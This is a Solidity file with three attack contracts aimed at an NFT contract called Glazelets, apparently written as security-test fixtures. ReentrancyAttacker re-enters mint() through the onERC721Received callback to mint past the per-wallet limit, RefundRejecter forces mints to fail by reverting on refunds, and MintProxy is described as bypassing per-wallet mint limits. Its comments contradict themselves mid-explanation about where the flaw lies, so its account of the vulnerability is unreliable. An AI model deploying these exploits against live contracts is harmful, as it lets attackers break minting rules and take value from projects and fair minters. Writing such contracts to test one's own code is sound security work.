// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IGlazelets {
    function mint(string memory _origin) external payable;
    function mintPrice() external view returns (uint256);
    function mintsPerWallet(address) external view returns (uint256);
    function MAX_MINT_PER_WALLET() external view returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
}

/**
 * @title ReentrancyAttacker
 * @dev Exploits the reentrancy vulnerability in Glazelets.mint()
 *
 * The attack works because:
 * 1. mint() sends refund via call() which triggers receive()
 * 2. State (mintsPerWallet) is updated BEFORE the refund
 * 3. But we can re-enter during refund and mint again
 *
 * Wait - actually looking more carefully, mintsPerWallet IS updated
 * before the refund. Let me check the actual vulnerability...
 *
 * The issue is: _safeMint can trigger onERC721Received on the recipient
 * BEFORE mintsPerWallet is incremented!
 */
contract ReentrancyAttacker {
    IGlazelets public glazelets;
    uint256 public attackCount;
    uint256 public maxAttacks;

    constructor(address _glazelets) {
        glazelets = IGlazelets(_glazelets);
        maxAttacks = 10; // Try to mint 10 tokens
    }

    function attack() external payable {
        attackCount = 0;
        uint256 price = glazelets.mintPrice();
        // Send extra to trigger refund
        glazelets.mint{value: price * 2}("attack");
    }

    // This is called by _safeMint -> BEFORE mintsPerWallet is incremented!
    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external returns (bytes4) {
        attackCount++;

        // Check if we can re-enter
        // The vulnerability: mintsPerWallet[this] hasn't been incremented yet!
        if (attackCount < maxAttacks) {
            uint256 price = glazelets.mintPrice();
            if (address(this).balance >= price * 2) {
                // Re-enter the mint function
                glazelets.mint{value: price * 2}("reentrant-attack");
            }
        }

        return this.onERC721Received.selector;
    }

    receive() external payable {}
}

/**
 * @title RefundRejecter
 * @dev Contract that cannot receive ETH refunds, causing mint to fail
 */
contract RefundRejecter {
    IGlazelets public glazelets;
    bool public rejectRefunds = true;

    constructor(address _glazelets) {
        glazelets = IGlazelets(_glazelets);
    }

    function mintWithOverpayment() external payable {
        // Send more than needed, refund will fail because receive() reverts
        glazelets.mint{value: msg.value}("will-fail");
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external pure returns (bytes4) {
        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }

    // Receive ETH but revert to simulate a contract that can't accept refunds
    receive() external payable {
        if (rejectRefunds) {
            revert("I reject ETH");
        }
    }
}

interface IERC721 {
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
    function totalSupply() external view returns (uint256);
}

/**
 * @title MintProxy
 * @dev Used to bypass per-wallet mint limits
 */
contract MintProxy {
    IGlazelets public glazelets;
    uint256 public lastTokenId;

    constructor(address _glazelets) {
        glazelets = IGlazelets(_glazelets);
    }

    function mintFor(address recipient, string memory origin) external payable {
        // Mint to this contract first
        glazelets.mint{value: msg.value}(origin);

        // Transfer to the actual recipient
        IERC721(address(glazelets)).safeTransferFrom(address(this), recipient, lastTokenId);
    }

    function onERC721Received(
        address,
        address,
        uint256 tokenId,
        bytes calldata
    ) external returns (bytes4) {
        lastTokenId = tokenId;
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}
